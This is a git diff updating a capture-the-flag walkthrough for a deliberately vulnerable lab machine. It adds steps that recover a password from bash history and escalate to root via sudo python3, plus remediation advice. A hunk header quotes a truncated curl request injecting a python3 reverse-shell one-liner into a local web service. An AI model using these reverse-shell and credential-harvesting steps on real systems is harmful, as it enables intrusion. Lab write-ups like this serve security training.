@@ -213,18 +213,30 @@ curl 'http://127.0.0.1:9999/?cmd=python3%20-c%20"import%20socket,os,pty;s=socket
 Retrieved **user flag**:
 
 ```bash
+cd
+ls -la
 cat user.txt
 ```
 
 **User Flag:** `DarkHole{'This_is_the_life_man_better_than_a_cruise'}`
 
-![User CTF](assets/screenshots/user_ctf.png)
+![User CTF](assets/screenshots/losy_user_ctf.png)
 
 ---
 
 ## Privilege Escalation
 
 ### Privilege Escalation (losy → root)
+
+Examined losy's bash history:
+
+```bash
+cat .bash_history
+```
+
+**Found Password:** `gang` (losy's password stored in command history)
+
+![Password Found](assets/screenshots/passwd_found.png)
 
 Checked sudo privileges:
 
@@ -234,7 +246,7 @@ sudo -l
 
 **Finding:** User `losy` can run `/usr/bin/python3` as root without password.
 
-![Losy Password](assets/screenshots/losy-passwd.png)
+![Sudo Privileges](assets/screenshots/sudo_l.png)
 
 #### Exploitation
 
@@ -292,9 +304,11 @@ cat /root/root.txt
    ↓
 10. RCE via Local Web Service (reverse shell as losy)
    ↓
-11. Privilege Escalation (sudo python3)
+11. Enumeration as losy (cat .bash_history - found password "gang")
    ↓
-12. Root Access & Flag Capture
+12. Privilege Escalation (sudo python3)
+   ↓
+13. Root Access & Flag Capture
 ```
 
 ---
@@ -305,7 +319,8 @@ cat /root/root.txt
 2. **Hardcoded Credentials** - Credentials stored in version control
 3. **SQL Injection** - Unauthenticated database access
 4. **Local Web Service with RCE** - Unauthenticated command execution on localhost:9999 running as losy user
-5. **Sudo Misconfiguration** - Unrestricted python3 execution as root
+5. **Sensitive Information in Bash History** - Losy's password exposed in bash command history
+6. **Sudo Misconfiguration** - Unrestricted python3 execution as root
 
 ---
 
@@ -317,6 +332,7 @@ cat /root/root.txt
 - Secure or disable local development services in production
 - Implement proper authentication and authorization for internal services
 - Use secrets management solutions
+- Configure bash to not store sensitive commands in history (`HISTCONTROL`, `HISTIGNORE`)
 - Apply principle of least privilege for sudo permissions
 - Regular security audits and penetration testing
 
